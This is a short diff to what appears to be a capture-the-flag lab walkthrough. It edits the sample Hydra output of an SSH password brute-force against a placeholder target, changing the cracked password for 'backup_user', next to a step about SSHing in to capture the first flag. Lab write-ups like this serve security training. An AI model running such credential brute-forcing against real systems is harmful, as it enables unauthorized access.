@@ -68,7 +68,7 @@ hydra -l backup_user \
 Hydra finds the password within seconds:
 
 ```
-[22][ssh] host: <target_ip>   login: backup_user   password: p@ssw0rd
+[22][ssh] host: <target_ip>   login: backup_user   password: password@123
 ```
 
 ### 1.3 SSH in and capture Flag 1
